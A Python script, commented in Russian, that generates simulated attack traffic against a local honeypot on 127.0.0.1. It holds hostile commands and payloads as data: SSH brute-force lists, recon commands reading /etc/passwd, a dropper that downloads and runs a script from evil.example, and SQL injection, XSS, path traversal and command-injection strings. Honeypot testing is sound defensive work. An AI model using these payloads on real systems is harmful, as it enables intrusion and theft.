# симулятор атак: бьет только по нашему honeypot на этом же компе
import argparse
import asyncio
import random

import aiohttp
import asyncssh

HOST = "127.0.0.1"  # чужие адреса не трогаем

# "атакующие": у каждого свой ip (весь 127.0.0.x это наш комп)
ATTACKERS = [f"127.0.0.{i}" for i in range(2, 10)]

USERS = ["root", "admin", "user", "test", "ubuntu", "pi", "oracle", "postgres"]
BAD_PASSWORDS = ["letmein", "P@ssw0rd", "admin123", "qwerty123",
                 "111111", "dragon", "master", "hello"]
WEAK_PASSWORD = "123456"  # такой пароль honeypot принимает

RECON = ["uname -a", "whoami", "id", "ls", "cat /etc/passwd", "ps aux"]
DROPPER = RECON[:2] + ["wget http://evil.example/x.sh", "chmod +x x.sh", "./x.sh"]

WEB_PATHS = ["/admin", "/wp-login.php", "/phpmyadmin", "/.env", "/robots.txt"]
WEB_ATTACKS = [
    {"id": "1' or 1=1--"},
    {"q": "<script>alert(1)</script>"},
    {"file": "../../../etc/passwd"},
    {"cmd": "x; cat /etc/passwd"},
]
SCANNER_AGENTS = ["sqlmap/1.7.2", "Nmap Scripting Engine", "Nikto/2.5.0"]


def local_addr(one_ip):
    # с какого адреса "атакует" клиент
    if one_ip:
        return None  # все с 127.0.0.1
    return (random.choice(ATTACKERS), 0)


async def safe(coro):
    # одна упавшая атака не должна ронять остальные
    try:
        await coro
        return True
    except Exception as e:
        print("ошибка:", type(e).__name__, e)
        return False


async def ssh_scan(port, one_ip):
    # только подключился, прочитал баннер и ушел
    r, w = await asyncio.open_connection(HOST, port, local_addr=local_addr(one_ip))
    await r.readline()
    w.close()
    try:
        await w.wait_closed()
    except ConnectionError:
        pass


async def ssh_brute(port, attempts, one_ip):
    # один атакующий, много попыток с неверными паролями
    addr = local_addr(one_ip)
    for _ in range(attempts):
        try:
            conn = await asyncssh.connect(
                HOST, port, username=random.choice(USERS),
                password=random.choice(BAD_PASSWORDS),
                known_hosts=None, local_addr=addr)
            conn.close()  # вдруг пароль подошел
            await conn.wait_closed()
        except asyncssh.PermissionDenied:
            pass  # так и надо


async def ssh_intruder(port, commands, delay, one_ip):
    # заходит по слабому паролю и вводит команды
    async with asyncssh.connect(
            HOST, port, username="root", password=WEAK_PASSWORD,
            known_hosts=None, local_addr=local_addr(one_ip)) as conn:
        for cmd in commands:
            await conn.run(cmd)
            await asyncio.sleep(delay * random.uniform(0.8, 1.2))


async def fetch(s, method, url, **kw):
    async with s.request(method, url, **kw) as r:
        await r.read()


async def web_probe(port, one_ip, attack):
    connector = aiohttp.TCPConnector(local_addr=local_addr(one_ip))
    async with aiohttp.ClientSession(connector=connector) as s:
        base = f"http://{HOST}:{port}"
        for path in WEB_PATHS:
            await fetch(s, "GET", base + path)
        if attack:
            ua = {"User-Agent": random.choice(SCANNER_AGENTS)}
            for params in WEB_ATTACKS:
                await fetch(s, "GET", base + "/", params=params, headers=ua)
            for _ in range(5):
                data = {"log": random.choice(USERS), "pwd": random.choice(BAD_PASSWORDS)}
                await fetch(s, "POST", base + "/wp-login.php", data=data, headers=ua)


async def simulate(ssh_port=2222, http_port=8080, scans=10, brutes=5, attempts=10,
                   bots=8, humans=2, webs=10, one_ip=False, human_delay=5):
    jobs = []
    jobs += [ssh_scan(ssh_port, one_ip) for _ in range(scans)]
    jobs += [ssh_brute(ssh_port, attempts, one_ip) for _ in range(brutes)]
    for _ in range(bots):
        cmds = random.choice([RECON, DROPPER])
        jobs.append(ssh_intruder(ssh_port, cmds, 0.3, one_ip))
    for _ in range(humans):
        jobs.append(ssh_intruder(ssh_port, RECON[:4], human_delay, one_ip))
    for i in range(webs):
        jobs.append(web_probe(http_port, one_ip, attack=(i % 2 == 0)))

    results = await asyncio.gather(*(safe(j) for j in jobs))
    return sum(results), len(jobs)


if __name__ == "__main__":
    p = argparse.ArgumentParser(description="симулятор атак на локальный honeypot")
    p.add_argument("--ssh-port", type=int, default=2222)
    p.add_argument("--http-port", type=int, default=8080)
    p.add_argument("--scans", type=int, default=10)
    p.add_argument("--brutes", type=int, default=5)
    p.add_argument("--attempts", type=int, default=10)
    p.add_argument("--bots", type=int, default=8)
    p.add_argument("--humans", type=int, default=2)
    p.add_argument("--webs", type=int, default=10)
    p.add_argument("--one-ip", action="store_true",
                   help="все с 127.0.0.1 (если другие адреса не работают)")
    a = p.parse_args()
    ok, total = asyncio.run(simulate(a.ssh_port, a.http_port, a.scans, a.brutes,
                                     a.attempts, a.bots, a.humans, a.webs, a.one_ip))
    print(f"готово: {ok} из {total} сценариев")